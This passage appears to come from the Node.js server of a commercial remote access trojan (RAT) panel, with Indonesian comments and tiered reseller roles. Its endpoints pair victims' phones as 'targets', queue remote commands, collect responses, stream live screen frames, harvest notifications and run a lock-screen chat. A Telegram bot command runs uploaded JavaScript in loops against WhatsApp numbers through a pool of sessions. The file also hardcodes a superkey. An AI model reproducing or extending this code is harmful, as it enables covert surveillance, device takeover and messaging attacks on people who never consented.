  // ❌ Member, VIP, Reseller TIDAK BISA akses pairId
  if (!canAccessRAT(user.role)) {
    return res.json({ 
      valid: false, 
      message: "Akses ditolak. Hanya role tertentu yang bisa melihat Pair ID",
      role: user.role 
    });
  }
  
  if (!user.pairId) {
    user.pairId = genPairId();
    saveDatabase(db);
    console.log('[PAIRID] Generated for: ' + user.username + ' → ' + user.pairId);
  }
  
  res.json({ 
    valid: true, 
    pairId: user.pairId, 
    username: user.username, 
    role: user.role 
  });
});

// ─── 2. GET MY DEVICES ──────────────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin → lihat SEMUA device miliknya
// ✅ Member, VIP, Reseller → lihat device yang diberi akses (dari device_perms.json)
app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  // ✅ Role yang diizinkan → lihat semua device miliknya
  if (canAccessRAT(user.role)) {
    const owned = targets.filter(t => t.owner === user.username);
    return res.json({ 
      valid: true, 
      pairId: user.pairId, 
      role: user.role, 
      devices: owned 
    });
  }

  // ❌ Member, VIP, Reseller → cek permission dari device_perms.json
  const perms = loadDevicePerms();
  const userPerm = perms[user.username.toLowerCase()];

  let allowedDevices = [];

  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) {
      allowedDevices = targets;
    } else if (Array.isArray(userPerm.devices) && userPerm.devices.length > 0) {
      allowedDevices = targets.filter(t => userPerm.devices.includes(t.id));
    }
  } else {
    // Cek ratPerms dari Owner (legacy)
    for (const owner of db.filter(u => canAccessRAT(u.role))) {
      const perm = owner.ratPerms?.[user.username];
      if (!perm || !perm.approved) continue;
      const ownerDevices = targets.filter(t => t.owner === owner.username);
      if (perm.allDevices) {
        allowedDevices = allowedDevices.concat(ownerDevices);
      } else {
        allowedDevices = allowedDevices.concat(
          ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id))
        );
      }
    }
  }

  res.json({ 
    valid: true, 
    pairId: null, 
    role: user.role, 
    devices: allowedDevices 
  });
});

// ─── 3. PAIR TARGET ──────────────────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa: member, vip, reseller
app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) {
    return res.status(400).json({ error: 'pairId dan deviceId wajib' });
  }

  let db = loadDatabase();

  // Auto-generate pairId untuk user yang belum punya
  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      console.log('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);

  const ownerIdx = db.findIndex(u =>
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );

  if (ownerIdx === -1) {
    return res.status(404).json({ 
      error: 'PairID tidak valid', 
      hint: 'Cek pairId di Device Dashboard' 
    });
  }

  const owner = db[ownerIdx];
  
  // ✅ Hanya role yang diizinkan yang bisa pair device
  if (!canAccessRAT(owner.role)) {
    return res.status(403).json({ 
      error: 'Akses ditolak', 
      hint: 'Hanya role tertentu yang bisa menautkan device' 
    });
  }

  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }

  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { 
    id: deviceId, 
    model: model || 'Unknown', 
    battery: battery || '?', 
    owner: owner.username, 
    status: 'Online', 
    lastSeen: new Date() 
  };
  
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else t.push(dev);
  saveRat(RAT_TARGETS, t);
  
  console.log('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

// ─── 4. LIST TARGETS ────────────────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin → lihat SEMUA
// ❌ Member, VIP, Reseller → hanya lihat yang diberi akses
app.get('/api/list-targets', (req, res) => {
  const { key, owner } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });
  
  const targets = readRat(RAT_TARGETS);
  
  // ✅ Role yang diizinkan → lihat semua
  if (canAccessRAT(user.role)) {
    return res.json(owner ? targets.filter(x => x.owner === owner) : targets);
  }
  
  // ❌ Member, VIP, Reseller → hanya yang diberi akses
  const perms = loadDevicePerms();
  const userPerm = perms[user.username.toLowerCase()];
  let allowedDevices = [];
  
  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) {
      allowedDevices = targets;
    } else if (Array.isArray(userPerm.devices)) {
      allowedDevices = targets.filter(t => userPerm.devices.includes(t.id));
    }
  }
  
  res.json(allowedDevices);
});

// ─── 5. SEND COMMAND ────────────────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa: member, vip, reseller
app.post('/api/send-command', (req, res) => {
  const { key, id, command, extra } = req.body;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: 'Invalid key' });
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });
  
  // ❌ Hanya role yang diizinkan yang bisa kirim command
  if (!canAccessRAT(user.role)) {
    return res.status(403).json({ 
      valid: false, 
      error: 'Akses ditolak. Hanya role tertentu yang bisa mengirim command',
      role: user.role 
    });
  }
  
  if (!id || !command) {
    return res.status(400).json({ error: 'id dan command wajib' });
  }

  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ 
    targetId: id, 
    command, 
    extra: extra || '', 
    timestamp: new Date(),
    from: user.username 
  });
  saveRat('./rat_commands.json', cmds);
  
  console.log('[CMD] ' + user.username + ' → ' + id + ': ' + command + (extra ? ' | extra: ' + extra : ''));
  res.json({ status: 'queued' });
});

// ─── 6. GET COMMAND ─────────────────────────────────────────────────────────
// ✅ Semua user: Bisa ambil command (device polling) — TIDAK ADA RESTRIKSI
app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat('./rat_commands.json');
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat('./rat_commands.json', cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

// ─── 7. POST RESPONSE ──────────────────────────────────────────────────────
// ✅ Semua user: Bisa kirim response (device report) — TIDAK ADA RESTRIKSI
app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat('./rat_responses.json');
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat('./rat_responses.json', resps);
  console.log('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

// ─── 8. GET RESPONSE ───────────────────────────────────────────────────────
// ✅ Semua user: Bisa ambil response (dashboard polling) — TIDAK ADA RESTRIKSI
app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat('./rat_responses.json');
  const found = resps.find(r => r.targetId === req.params.id);
  if (found) {
    return res.json(found);
  }
  res.status(204).send();
});

// ─── 9. LIVE FRAME ──────────────────────────────────────────────────────────
// ✅ Semua user: Bisa kirim/ambil frame (streaming) — TIDAK ADA RESTRIKSI
app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

// ─── 10. HEARTBEAT ──────────────────────────────────────────────────────────
// ✅ Semua user: Bisa kirim heartbeat (device keep-alive) — TIDAK ADA RESTRIKSI
app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

// ─── 11. REGISTER TARGET ────────────────────────────────────────────────────
// ✅ Semua user: Bisa register device — TIDAK ADA RESTRIKSI
app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

// ─── 12. POST NOTIFICATION ──────────────────────────────────────────────────
// ✅ Semua user: Bisa kirim notifikasi — TIDAK ADA RESTRIKSI
app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat('./rat_notifs.json');
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat('./rat_notifs.json', n);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const n = readRat('./rat_notifs.json');
  res.json(n.filter(x => x.targetId === req.params.id));
});

// ─── 13. LOCK CHAT ──────────────────────────────────────────────────────────
// ✅ Semua user: Bisa kirim/ambil chat (lock chat) — TIDAK ADA RESTRIKSI
const lockChats = {};

app.post('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[id]) lockChats[id] = [];
  const msg = { from: from || 'owner', text, time: new Date().toISOString().substring(11, 16) };
  lockChats[id].push(msg);
  if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
  console.log(`[CHAT] ${from||'owner'} → ${id}: ${text}`);
  res.json({ status: 'sent' });
});

app.get('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

app.get('/api/lock-chat-all/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

app.delete('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  lockChats[id] = [];
  res.json({ status: 'cleared' });
});

// ─── 14. GRANT MEMBER ──────────────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa: member, vip, reseller
app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  
  // ✅ Cek apakah owner punya akses RAT
  if (!owner || !canAccessRAT(owner.role)) {
    return res.status(403).json({ valid: false, message: "Akses ditolak. Hanya role tertentu yang bisa grant akses" });
  }
  
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
  };
  saveDatabase(db);
  console.log(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

// ─── 15. REVOKE MEMBER ─────────────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa: member, vip, reseller
app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  
  if (!owner || !canAccessRAT(owner.role)) {
    return res.status(403).json({ valid: false, message: "Akses ditolak. Hanya role tertentu yang bisa revoke akses" });
  }
  
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

// ─── 16. ADMIN: LIST PAIR IDS ─────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa: member, vip, reseller
app.get('/admin/listpairids', (req, res) => {
  const { key, superkey } = req.query;
  
  // Cek key valid
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: 'Invalid key' });
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !canAccessRAT(user.role)) {
    return res.status(403).json({ error: 'Forbidden - Only authorized roles can access' });
  }
  
  // Superkey tetap bisa dipake
  if (superkey === 'CRPT-SUPER-2025') {
    const list = db.map(u => ({ username: u.username, role: u.role, pairId: u.pairId || 'NONE' }));
    return res.json(list);
  }
  
  // Tanpa superkey, hanya lihat sendiri
  const list = db.filter(u => u.username === user.username).map(u => ({ 
    username: u.username, 
    role: u.role, 
    pairId: u.pairId || 'NONE' 
  }));
  res.json(list);
});

// ─── 17. ADMIN: GENERATE PAIR ID ──────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Tidak bisa: member, vip, reseller
app.get('/admin/genpairid', (req, res) => {
  const { key, username } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: 'Invalid key' });
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !canAccessRAT(user.role)) {
    return res.status(403).json({ error: 'Forbidden - Only authorized roles can generate pairId' });
  }
  
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ error: 'User not found' });
  db[idx].pairId = genPairId();
  saveDatabase(db);
  console.log(`[ADMIN] Force generated pairId for ${username}: ${db[idx].pairId}`);
  res.json({ username, pairId: db[idx].pairId });
});

// ─── 18. DEVICE PERMS ──────────────────────────────────────────────────────
// ✅ Bisa: developer, founder, kingz, high owner, owner, tk, admin
// ❌ Member, VIP, Reseller → hanya bisa lihat permission sendiri
app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  
  // Jika requester adalah role yang diizinkan dan minta data sendiri
  if (canAccessRAT(requester?.role) || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
    const isAuthorized = canAccessRAT(requester?.role);
    if (isAuthorized && keyInfo.username === username) {
      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
    }
  }

  return res.json({ valid: true, ...userPerm });
});

app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  
  // ✅ Hanya role yang diizinkan yang bisa manage permissions
  if (!requester || !canAccessRAT(requester.role)) {
    return res.status(403).json({ valid: false, error: "Only authorized roles can manage permissions" });
  }

  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });

  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);

  return res.json({ valid: true, message: "Permission updated" });
});

app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  
  // ✅ Hanya role yang diizinkan yang bisa lihat semua perms
  if (!requester || !canAccessRAT(requester.role)) {
    return res.status(403).json({ valid: false });
  }
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

// ─── CHAT PRIVATE - GET MESSAGES ──────────────────────────────────
app.get('/api/chat/private', (req, res) => {
  const { key, username, target } = req.query;
  
  console.log(`[CHAT PRIVATE] ${username} -> ${target}`);
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) {
    return res.json({ valid: false, message: 'User not found' });
  }
  
  // ─── AMBIL PESAN PRIVATE ──────────────────────────────────────
  const privateMessages = chatList.filter(m => 
    (m.from === username && m.to === target) ||
    (m.from === target && m.to === username)
  );
  
  // ─── TANDAI PESAN YANG BELUM DIBACA ──────────────────────────
  const unreadMessages = privateMessages.filter(m => 
    m.to === username && m.read !== true
  );
  
  // ─── TANDAI SEBAGAI DIBACA ──────────────────────────────────────
  for (const msg of unreadMessages) {
    msg.read = true;
  }
  saveChat();
  
  res.json({ 
    valid: true, 
    messages: privateMessages,
    unreadCount: unreadMessages.length
  });
});

// ─── CHAT PRIVATE - SEND MESSAGE ──────────────────────────────────
app.post('/api/chat/private', (req, res) => {
  const { key, username, target, message, image, type } = req.body;
  
  console.log(`[CHAT PRIVATE SEND] ${username} -> ${target}: ${message || '[image]'}`);
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) {
    return res.json({ valid: false, message: 'User not found' });
  }
  
  const targetUser = db.find(u => u.username === target);
  if (!targetUser) {
    return res.json({ valid: false, message: 'Target user not found' });
  }
  
  if (!message && !image) {
    return res.json({ valid: false, message: 'Message empty' });
  }
  
  // ─── BUAT PESAN ──────────────────────────────────────────────────
  const chat = {
    id: 'msg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4),
    from: username,
    to: target,
    message: message || '',
    image: image || '',
    type: image ? 'image' : 'text',
    timestamp: new Date().toISOString(),
    read: false,
  };
  
  chatList.push(chat);
  saveChat();
  
  // ─── KIRIM KE WEBSOCKET ──────────────────────────────────────────
  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'private_message',
        message: chat
      }));
    }
  }
  
  // ─── SIMPAN LOG ──────────────────────────────────────────────────
  saveUserLog(username, 'chat_private', 
    `Chat ke ${target}`,
    `Pesan: ${message || '[image]'}`
  );
  
  res.json({ 
    valid: true, 
    message: chat,
    status: 'sent'
  });
});

// ─── CHAT PRIVATE - GET USERS ──────────────────────────────────────
app.get('/api/chat/users', (req, res) => {
  const { key } = req.query;
  
  console.log('[CHAT USERS] Request by key:', key);
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }
  
  const db = loadDatabase();
  
  // ─── AMBIL SEMUA USER KECUALI DIRI SENDIRI ──────────────────────
  const users = db
    .map(u => u.username)
    .filter(u => u !== keyInfo.username);
  
  console.log('[CHAT USERS] Found:', users.length, 'users');
  
  res.json({ 
    valid: true, 
    users: users,
    total: users.length
  });
});

// ─── CHAT PRIVATE - DELETE MESSAGE ──────────────────────────────────
app.delete('/api/chat/private', (req, res) => {
  const { key, username, messageId } = req.query;
  
  console.log(`[CHAT DELETE] ${username} delete: ${messageId}`);
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) {
    return res.json({ valid: false, message: 'User not found' });
  }
  
  // ─── HAPUS PESAN ──────────────────────────────────────────────────
  const index = chatList.findIndex(m => m.id === messageId && (m.from === username || m.to === username));
  if (index === -1) {
    return res.json({ valid: false, message: 'Message not found' });
  }
  
  chatList.splice(index, 1);
  saveChat();
  
  res.json({ 
    valid: true, 
    message: 'Message deleted'
  });
});

// ─── CHAT PRIVATE - GET UNREAD COUNT ──────────────────────────────
app.get('/api/chat/unread', (req, res) => {
  const { key, username } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: 'Invalid session key' });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === username);
  if (!user) {
    return res.json({ valid: false, message: 'User not found' });
  }
  
  // ─── HITUNG PESAN BELUM DIBACA ──────────────────────────────────
  const unread = chatList.filter(m => 
    m.to === username && m.read !== true
  );
  
  // ─── GROUP BY FROM ──────────────────────────────────────────────
  const unreadByUser = {};
  for (const msg of unread) {
    if (!unreadByUser[msg.from]) {
      unreadByUser[msg.from] = 0;
    }
    unreadByUser[msg.from]++;
  }
  
  res.json({ 
    valid: true, 
    totalUnread: unread.length,
    unreadByUser: unreadByUser
  });
});

// ─── UPLOAD IMAGE UNTUK CHAT ──────────────────────────────────────
const chatUpload = multer({ 
  storage: multer.diskStorage({
    destination: function (req, file, cb) {
      const dir = './chat_uploads';
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      cb(null, dir);
    },
    filename: function (req, file, cb) {
      const unique = Date.now() + '_' + Math.round(Math.random() * 1E9);
      const ext = path.extname(file.originalname);
      cb(null, 'chat_' + unique + ext);
    }
  }),
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    // ─── HANYA GAMBAR ──────────────────────────────────────────────
    const allowed = ['image/jpg', 'image/png', 'image/gif', 'image/webp'];
    if (allowed.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Hanya file gambar yang diizinkan!'));
    }
  }
});

app.post('/api/chat/upload-image', chatUpload.single('image'), (req, res) => {
  const { key, username } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: 'Invalid session' });
  }
  if (!req.file) {
    return res.json({ valid: false, message: 'No file uploaded' });
  }
  const baseUrl = `http://cp.zyrostore.id:3594:${PORT}`;
  const fileUrl = `${baseUrl}/chat_uploads/${req.file.filename}`;
  res.json({ valid: true, url: fileUrl });
});

function extractFunctions(filePath) {
  const code = fs.readFileSync(filePath, 'utf8');
  const results = {};
  const regex = /async function (\w+)\s*\(([^)]*)\)/g;
  let match;

  while ((match = regex.exec(code)) !== null) {
    const funcName = match[1];
    const rawParams = match[2].split(',').map(p => p.trim()).filter(Boolean);
    results[funcName] = rawParams;
  }

  return results;
}

async function callAllFunctionsFromFile(filePath, sock, targetJid) {
  const code = fs.readFileSync(filePath, 'utf8');
  const extractedFuncs = extractFunctions(filePath);
  const funcNames = Object.keys(extractedFuncs);

  if (funcNames.length === 0) throw new Error('Gak ada async function ditemukan');

  const callStatements = funcNames.map(funcName => {
    const params = extractedFuncs[funcName];
    const args = params.map(p => {
      if (p === 'sock') return 'sock';
      if (p === 'targetJid') return 'targetJid';
      return 'null';
    }).join(', ');
    return `if (typeof ${funcName} === 'function') await ${funcName}(${args});`;
  }).join('\n');

  const fullCode = `
    ${code}
    ${callStatements}
  `;

  const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
  const fn = new AsyncFunction('sock', 'targetJid', 'require', 'console', 'setTimeout', fullCode);
  await fn(sock, targetJid, require, console, setTimeout);
}

bot.onText(/\/test (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from ? msg.from.id : null;

  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ <b>AKSES DITOLAK!</b>\nLu bukan bos gua!", { parse_mode: 'HTML' });
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "⚠️ Reply dulu ke file .js target, Bos!", { parse_mode: 'HTML' });
  }

  const doc = msg.reply_to_message.document;
  if (!doc) {
    return bot.sendMessage(chatId, "⚠️ Reply harus ke file .js, Bos!", { parse_mode: 'HTML' });
  }

  const inputText = match[1].trim();
  const args = inputText.split(/\s+/);
  const targetInput = args[0];
  const loopCount = parseInt(args[1], 10) || 1;

  if (isNaN(loopCount) || loopCount <= 0) {
    return bot.sendMessage(chatId, "⚠️ Jumlah loop harus angka positif, Bos!", { parse_mode: 'HTML' });
  }

  const fileLink = await bot.getFileLink(doc.file_id);
  const filePath = `/tmp/${doc.file_name}`;

  await new Promise((resolve, reject) => {
    const fileStream = fs.createWriteStream(filePath);
    https.get(fileLink, res => {
      res.pipe(fileStream);
      fileStream.on('finish', resolve);
      fileStream.on('error', reject);
    });
  });

  const extractedFuncs = extractFunctions(filePath);
  const funcNames = Object.keys(extractedFuncs);

  if (funcNames.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Gak ada async function yang ketemu di file itu, Bos!", { parse_mode: 'HTML' });
  }

  let targetJid = targetInput.endsWith("@g.us") || targetInput.endsWith("@s.whatsapp.net")
    ? targetInput
    : targetInput.replace(/\D/g, "") + "@s.whatsapp.net";

  let availableSocks = typeof activeConnections !== 'undefined' ? Object.values(activeConnections) : [];
  if (availableSocks.length === 0) {
    return bot.sendMessage(chatId, "❌ Gak ada koneksi aktif.", { parse_mode: 'HTML' });
  }

  const selectedSock = availableSocks[Math.floor(Math.random() * availableSocks.length)];

  const statusMsg = await bot.sendMessage(chatId,
    `⏳ <b>MEMULAI TEST</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetJid}</code>\n⚙️ <b>Functions:</b> <code>${funcNames.join(', ')}</code>\n🔁 <b>Loop:</b> <code>${loopCount}x</code>\n🌍 <b>Pool Sender:</b> <code>${availableSocks.length} aktif</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    { parse_mode: 'HTML' }
  );

  setImmediate(async () => {
    let successHits = 0;
    try {
      for (let i = 0; i < loopCount; i++) {
        await callAllFunctionsFromFile(filePath, selectedSock, targetJid);

        await new Promise(resolve => setTimeout(resolve, 500));
        successHits++;
      }

      await bot.editMessageText(
        `✅ <b>TEST SELESAI!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetJid}</code>\n⚙️ <b>Functions:</b> <code>${funcNames.join(', ')}</code>\n📊 <b>Sukses:</b> <code>${successHits}/${loopCount}</code>\n━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
      );

    } catch (err) {
      bot.sendMessage(chatId, `❌ <b>Error di loop ke-${successHits}:</b>\n<code>${err.message}</code>`, { parse_mode: 'HTML' });
    }
  });
});

let publicMessages = [];
const PUBLIC_CHAT_FILE = 'public_chat.json';

if (fs.existsSync(PUBLIC_CHAT_FILE)) {
  try {
    publicMessages = JSON.parse(fs.readFileSync(PUBLIC_CHAT_FILE, 'utf8'));
  } catch (e) {
    publicMessages = [];
  }
}

function savePublicChat() {
  fs.writeFileSync(PUBLIC_CHAT_FILE, JSON.stringify(publicMessages, null, 2));
}

app.get("/publicChat", (req, res) => {
  const { key, lastId } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }
  
  if (lastId) {
    const lastIndex = publicMessages.findIndex(m => m.id === lastId);
    if (lastIndex !== -1) {
      return res.json({
        valid: true,
        messages: publicMessages.slice(lastIndex + 1),
        hasNew: true
      });
    }
  }
  
  res.json({
    valid: true,
    messages: publicMessages.slice(-100),
    total: publicMessages.length
  });
});

app.post("/publicChat", (req, res) => {
  const { key, message } = req.body;
  
  if (!message || message.trim().length === 0) {
    return res.json({ valid: false, message: "Message cannot be empty" });
  }
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }
  
  const newMessage = {
    id: Date.now().toString(36) + Math.random().toString(36).substr(2, 4),
    username: user.username,
    role: user.role || "member",
    message: message.trim(),
    timestamp: new Date().toISOString()
  };
  
  publicMessages.push(newMessage);
  savePublicChat();
  
  if (publicMessages.length > 500) {
    publicMessages = publicMessages.slice(-500);
    savePublicChat();
  }
  
  res.json({ valid: true, message: newMessage });
});

const roleHierarchy = {
  developer: 10,
  founder: 9,
  kingz: 8,
  high_owner: 7,
  owner: 6,
  tk: 5,
  admin: 4,
  reseller: 3,
  vip: 2,
  member: 1
};

const PERMISSION_LEVELS = {
  MEMBER: 1,
  VIP: 2,
  RESELLER: 3,
  ADMIN: 4,
  TK: 5,
  OWNER: 6,
  HIGH_OWNER: 7,
  KINGZ: 8,
  FOUNDER: 9,
  DEVELOPER: 10
};

function hasRolePermission(userRole, requiredLevel) {
  const userLevel = roleHierarchy[userRole?.toLowerCase()] || 0;
  return userLevel >= requiredLevel;
}

function canManageUser(managerRole, targetRole) {
  const managerLevel = roleHierarchy[managerRole?.toLowerCase()] || 0;
  const targetLevel = roleHierarchy[targetRole?.toLowerCase()] || 0;
  return managerLevel > targetLevel;
}

function getRoleLevel(role) {
  return roleHierarchy[role?.toLowerCase()] || 0;
}

app.get('/api/role/list', (req, res) => {
